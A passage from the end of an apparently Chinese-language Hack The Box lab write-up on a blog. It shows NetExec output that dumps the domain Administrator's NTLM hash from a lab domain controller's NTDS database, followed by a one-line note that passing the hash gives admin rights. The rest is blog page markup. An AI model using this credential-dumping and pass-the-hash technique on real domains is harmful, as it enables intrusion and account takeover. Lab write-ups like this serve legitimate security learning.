+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dumped <span style="color:#ae81ff">1</span> NTDS hashes to /home/wackymaker/.nxc/logs/ntds/10.129.234.50_None_2025-09-21_025253.ntds of which <span style="color:#ae81ff">1</span> were added to the database
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> To extract only enabled accounts from the output file, run the following command:
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> cat /home/wackymaker/.nxc/logs/ntds/10.129.234.50_None_2025-09-21_025253.ntds | grep -iv disabled | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f1
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> grep -iv disabled /home/wackymaker/.nxc/logs/ntds/10.129.234.50_None_2025-09-21_025253.ntds | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f1
+</span></span></code></pre></div><p>利用hash登陆后获得管理权限，到此结束</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a>
+        
+            <a href="/tags/htb/">Htb</a>
+        
+            <a href="/tags/%E5%9F%9F%E4%B9%8B%E9%AD%94%E6%B3%95/">域之魔法</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/baby/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">baby-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/sendai/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">sendai-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/scepter/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">scepter-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/sweep-htb/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">sweep-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/bicher-%E8%87%AA%E5%BB%BA/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">bicker-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 wackymaker
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.9feb0937132291db314540e31350de0da717928ca87e53cdebf73f0dfcdc569c.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
